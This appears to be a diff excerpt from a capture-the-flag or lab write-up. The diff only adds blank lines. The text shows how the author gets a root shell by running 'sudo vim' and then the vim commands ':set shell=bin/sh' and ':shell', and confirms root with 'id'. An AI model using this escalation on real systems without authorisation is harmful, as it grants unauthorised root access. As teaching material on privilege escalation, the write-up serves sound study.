@@ -57,7 +57,9 @@ I run
 _sudo vim_
 
 Then in vim you have to enter in  the command mode with : and type in the following
+
 _:set shell=bin/sh_
+
 _:shell_
 
 and so we got our shell to check the user we were running the sh shell, so i run id to check that indeed we were root
